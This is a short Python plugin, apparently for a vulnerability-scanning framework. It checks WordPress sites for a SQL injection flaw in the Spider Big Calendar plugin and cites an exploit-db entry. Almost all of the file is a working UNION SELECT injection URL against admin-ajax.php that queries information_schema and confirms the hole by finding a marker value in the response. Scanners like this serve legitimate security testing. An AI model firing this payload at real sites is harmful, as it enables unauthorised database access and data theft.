#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '冷不冷'
#http://www.exploit-db.com/exploits/36087/

import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):

	FETCH_PREFIX_URL = '%s/wp-admin/admin-ajax.php?action=spiderbigcalendar_month&theme_id=13&calendar=1&select=month,list,week,day,&date=2015-02&many_sp_calendar=1&cur_page_url=%s&cat_id=1)%%20UNION%%20SELECT%%20%s,1,%%20FROM_UNIXTIME(1423004400),1,(SELECT%%20CONCAT(CHAR(35,35,35,35),table_name,CHAR(35,35,35,35))%%20FROM%%20information_schema.tables%%20WHERE%%20table_name%%20LIKE%%20(%%20SELECT%%20CHAR(37,%%20117,%%20115,%%20101,%%20114,%%20115)%%20)%%20LIMIT%%201),1,1,1,1,%%20CHAR(110,%%20111,%%2095,%%20114,%%20101,%%20112,%%20101,%%2097,%%20116),1,1,1,1,1,1,1,1,1%%20FROM%%20DUAL;--%%20--%%20&widget=0' 
	FAKE_ID_TO_SEARCH = '12345677654321'
	PATTERN_TO_SEARCH = 'ev_ids=' + FAKE_ID_TO_SEARCH
	
	fullURL = FETCH_PREFIX_URL % (arg, arg, FAKE_ID_TO_SEARCH)
	code, head, res, errcode, _ = curl.curl(fullURL)
	if PATTERN_TO_SEARCH in res:
		security_hole(fullURL)
		
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://192.168.80.80/wordpress')[1])
